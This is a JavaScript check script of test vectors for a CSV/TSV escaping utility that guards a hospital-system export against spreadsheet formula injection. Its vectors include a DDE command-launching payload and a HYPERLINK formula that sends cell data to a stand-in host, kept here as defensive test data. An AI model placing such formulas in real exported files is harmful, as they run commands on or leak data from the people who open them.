/**
 * Vectors for src/utils/csvExport.js.
 *
 * These exist because running them is what caught the bug in the first draft:
 * a character class written as [ \t-​] that JavaScript reads as the range
 * U+0020–U+200B, which made the leading-whitespace guard match the empty
 * string and silently stop guarding. It looked correct in review three times.
 *
 * A script rather than a test file because this project has no test runner.
 * Wired into `npm run check`.
 */
import { escapeCsvValue, escapeTsvValue, unescapeCsvValue, buildCsvContent } from "../src/utils/csvExport.js"

const cases = []
const check = (label, actual, expected) => cases.push({ label, actual, expected, ok: actual === expected })

// --- formula neutralisation -------------------------------------------------
check("plain formula", escapeCsvValue("=1+1"), "'=1+1")
check("DDE payload", escapeCsvValue("=cmd|'/C calc'!A0"), "'=cmd|'/C calc'!A0")
check("hyperlink exfiltration", escapeCsvValue('=HYPERLINK("http://x/?"&A1,"Click")'), `"'=HYPERLINK(""http://x/?""&A1,""Click"")"`)
check("at-sign lead", escapeCsvValue("@SUM(A1:A9)"), "'@SUM(A1:A9)")
check("leading space then formula", escapeCsvValue(" =1+1"), "' =1+1")
check("two leading spaces", escapeCsvValue("  =1+1"), "'  =1+1")
check("leading tab", escapeCsvValue("\t=1+1"), "'\t=1+1")
check("zero-width space then formula", escapeCsvValue("​=1+1"), "'​=1+1")
check("plus lead", escapeCsvValue("+1+1"), "'+1+1")

// The case that made a "numeric" exemption unsafe: a phone number, not a sum.
check("E.164 phone keeps its plus", escapeCsvValue("+919876543210"), "'+919876543210")
check("spaced phone", escapeCsvValue("+91 98765 43210"), "'+91 98765 43210")

// --- legitimate data survives ----------------------------------------------
check("negative integer stays numeric", escapeCsvValue("-42"), "-42")
check("negative decimal stays numeric", escapeCsvValue("-0.5"), "-0.5")
check("bare-point decimal stays numeric", escapeCsvValue("-.5"), "-.5")
check("positive number untouched", escapeCsvValue("42"), "42")
check("number type untouched", escapeCsvValue(-42), "-42")

// Grouped negatives become text — but CONSISTENTLY, which is the point.
// A rule that accepts -99,999 and rejects en-IN's -1,00,000 makes one column
// half number and half text, and SUM() then omits the large rows silently.
check("en-IN grouped negative", escapeCsvValue("-1,00,000"), `"'-1,00,000"`)
check("US grouped negative", escapeCsvValue("-99,999"), `"'-99,999"`)
check("currency negative", escapeCsvValue("-₹4,500"), `"'-₹4,500"`)

check("placeholder dash", escapeCsvValue("-"), "'-")
check("ordinary text", escapeCsvValue("Sharma"), "Sharma")
check("empty", escapeCsvValue(""), "")
check("null", escapeCsvValue(null), "")
check("undefined", escapeCsvValue(undefined), "")
check("zero", escapeCsvValue(0), "0")
check("false", escapeCsvValue(false), "false")

// --- RFC 4180 quoting -------------------------------------------------------
check("comma", escapeCsvValue("Sharma, Arjun"), `"Sharma, Arjun"`)
check("quote doubled", escapeCsvValue('say "hi"'), `"say ""hi"""`)
check("newline", escapeCsvValue("line1\nline2"), `"line1\nline2"`)
check("carriage return quoted", escapeCsvValue("line1\rline2"), `"line1\rline2"`)

// --- TSV --------------------------------------------------------------------
// Neutralise before collapsing: the other order turns the leading tab into a
// space, which is not a formula lead, so the guard never fires.
check("tsv leading tab", escapeTsvValue("\t=1+1"), "' =1+1")
check("tsv DDE", escapeTsvValue("\t=cmd|'/C calc'!A0"), "' =cmd|'/C calc'!A0")
check("tsv collapses newline", escapeTsvValue("a\nb"), "a b")
check("tsv plain", escapeTsvValue("Sharma"), "Sharma")

// --- round trip -------------------------------------------------------------
// HMS exports are edited and re-uploaded. Without this the guard becomes
// permanent database content, and is invisible afterwards because the
// apostrophe is not itself a formula lead.
check("round trip phone", unescapeCsvValue("'+919876543210"), "+919876543210")
check("round trip dash", unescapeCsvValue("'-"), "-")
check("leaves a real apostrophe alone", unescapeCsvValue("'Tis"), "'Tis")
check("leaves plain text alone", unescapeCsvValue("Sharma"), "Sharma")
check("escape then unescape is identity", unescapeCsvValue(escapeCsvValue("=1+1")), "=1+1")

// --- document ---------------------------------------------------------------
check(
  "header row is escaped too",
  buildCsvContent(["=Name", "Phone"], [["Sharma", "+919876543210"]]),
  "'=Name,Phone\nSharma,'+919876543210"
)

const failed = cases.filter((c) => !c.ok)
const show = (s) => JSON.stringify(s)

if (!failed.length) {
  console.log(`check-csv-escaping: ${cases.length} vectors pass`)
  process.exit(0)
}

console.error(`check-csv-escaping: ${failed.length} of ${cases.length} vectors FAILED\n`)
for (const c of failed) {
  console.error(`  ${c.label}`)
  console.error(`      expected ${show(c.expected)}`)
  console.error(`      actual   ${show(c.actual)}`)
}
process.exit(1)
